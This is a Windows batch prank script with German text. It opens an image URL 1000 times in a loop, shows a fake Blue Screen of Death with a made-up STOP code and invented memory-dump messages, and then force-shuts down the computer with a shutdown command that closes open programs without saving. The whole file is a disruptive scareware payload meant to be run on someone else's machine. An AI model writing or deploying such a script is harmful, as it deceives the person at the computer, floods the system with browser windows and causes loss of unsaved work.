@echo off
:: Vollbildmodus aktivieren
mode con: cols=700 lines=300
title Fatal Error
color 1F
cls

:: Wartezeit für Effekt
echo Ein kritischer Fehler ist aufgetreten...
timeout /t 3 >nul
cls

:: 1000 mal die URL öffnen
set URL=https://debeste.de/upload/f0382cf12e3f50329e543549afffab636722.jpg
for /l %%i in (1, 1, 1000) do (
    start "" "%URL%"
)

:bsod
cls
echo.
echo.
echo                    Ein Problem wurde festgestellt. Windows wurde heruntergefahren, um Ihren Computer zu schützen.
echo.
echo                    Wenn dies das erste Mal ist, dass Sie diesen Fehler sehen, starten Sie Ihren Computer neu.
echo                    Falls dieser Fehler erneut auftritt, überprüfen Sie, ob neue Hardware oder Software richtig installiert ist.
echo.
echo.
echo                    *** STOP: 0x000000DEAD (0x00000001, 0x00000002, 0x00000003, 0x00000004)
echo.
echo                    Datenspeicher wird für Fehleranalyse gesichert...
echo                    Speicherabbild abgeschlossen.
echo.
echo                    Wenden Sie sich an den Systemadministrator.
echo.
echo                    Der PC wird in 5 Sekunden automatisch heruntergefahren...
timeout /t 5 >nul
shutdown /s /f /t 0
exit
